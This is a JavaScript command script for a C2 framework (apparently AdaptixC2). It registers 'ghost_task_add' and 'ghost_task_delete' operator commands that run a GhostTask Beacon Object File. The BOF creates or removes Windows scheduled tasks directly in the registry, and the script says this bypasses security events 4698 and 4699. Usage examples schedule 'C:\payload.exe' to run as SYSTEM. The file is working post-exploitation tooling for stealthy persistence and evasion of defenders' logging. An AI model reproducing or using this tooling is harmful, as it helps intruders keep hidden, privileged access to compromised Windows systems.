var metadata = {
    name: "GhostTask-BOF",
    description: "Create/delete scheduled tasks directly via registry (no Task Scheduler API). Bypasses events 4698/4699."
};

// ── ghost_task_add ───────────────────────────────────────────
var cmd_ghost_add = ax.create_command(
    "ghost_task_add",
    "Create a ghost scheduled task via registry (requires SYSTEM).",
    "ghost_task_add -n TaskName -p C:\\\\Windows\\\\System32\\\\cmd.exe -a \"/c whoami\" -s second -t 30 | ghost_task_add -n TaskName -p C:\\\\payload.exe -s daily -t 22:30 -u SYSTEM | ghost_task_add -n TaskName -p C:\\\\payload.exe -s weekly -t 09:00 -d monday,friday");
cmd_ghost_add.addArgFlagString("-n", "taskname", "Scheduled task name");
cmd_ghost_add.addArgFlagString("-p", "program",  "Executable path");
cmd_ghost_add.addArgFlagString("-s", "stype",    "Trigger: second | daily | weekly | logon");
cmd_ghost_add.addArgFlagString("-t", "time",     "HH:MM (daily/weekly) or N seconds (second)", "0");
cmd_ghost_add.addArgFlagString("-u", "username", "User to run the task as", "SYSTEM");
cmd_ghost_add.addArgFlagString("-a", "argument", "Arguments for the executable", "");
cmd_ghost_add.addArgFlagString("-d", "days",     "Days for weekly trigger (ex: monday,friday)", "monday");
cmd_ghost_add.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var taskname   = parsed_json["taskname"] || "";
    var program    = parsed_json["program"]  || "";
    var stype      = parsed_json["stype"]    || "";
    var time_val   = parsed_json["time"]     || "0";
    var username   = parsed_json["username"] || "SYSTEM";
    var argument   = parsed_json["argument"] || "";
    var days       = parsed_json["days"]     || "monday";
    if (!taskname) { ax.console_message(id, "missing -n <taskname>", "error"); return; }
    if (!program)  { ax.console_message(id, "missing -p <program>",  "error"); return; }
    if (!stype)    { ax.console_message(id, "missing -s <stype>: second | daily | weekly | logon", "error"); return; }
    var stype_lower = stype.toLowerCase();
    var pack_types, pack_args;
    if (stype_lower === "weekly") {
        pack_types = "int,cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr";
        pack_args  = [9, "add", taskname, program, argument, username, stype, time_val, days];
    } else if (stype_lower === "logon") {
        pack_types = "int,cstr,cstr,cstr,cstr,cstr,cstr";
        pack_args  = [7, "add", taskname, program, argument, username, stype];
    } else {
        pack_types = "int,cstr,cstr,cstr,cstr,cstr,cstr,cstr";
        pack_args  = [8, "add", taskname, program, argument, username, stype, time_val];
    }
    var bof_path   = ax.script_dir() + "_bin/GhostTask." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack(pack_types, pack_args);
    if (!ax.file_exists(bof_path)) { ax.console_message(id, "BOF not found: " + bof_path, "error"); return; }
    ax.execute_alias(id, cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: GhostTask add [" + taskname + "]", null);
});

// ── ghost_task_delete ────────────────────────────────────────
var cmd_ghost_delete = ax.create_command(
    "ghost_task_delete",
    "Delete a ghost scheduled task from the registry (requires SYSTEM). [NOISE: low]",
    "ghost_task_delete -n TaskName");
cmd_ghost_delete.addArgFlagString("-n", "taskname", "Name of the task to delete");
cmd_ghost_delete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var taskname   = parsed_json["taskname"] || "";
    if (!taskname) { ax.console_message(id, "missing -n <taskname>", "error"); return; }
    var bof_path   = ax.script_dir() + "_bin/GhostTask." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("int,cstr,cstr", [3, "delete", taskname]);
    if (!ax.file_exists(bof_path)) { ax.console_message(id, "BOF not found: " + bof_path, "error"); return; }
    ax.execute_alias(id, cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: GhostTask delete [" + taskname + "]", null);
});

// ── Register group ───────────────────────────────────────────
var group_ghost = ax.create_commands_group("GhostTask-BOF", [
    cmd_ghost_add,
    cmd_ghost_delete
]);
ax.register_commands_group(group_ghost, ["beacon", "gopher", "kharon", "NoNameAx"], ["windows"], []);
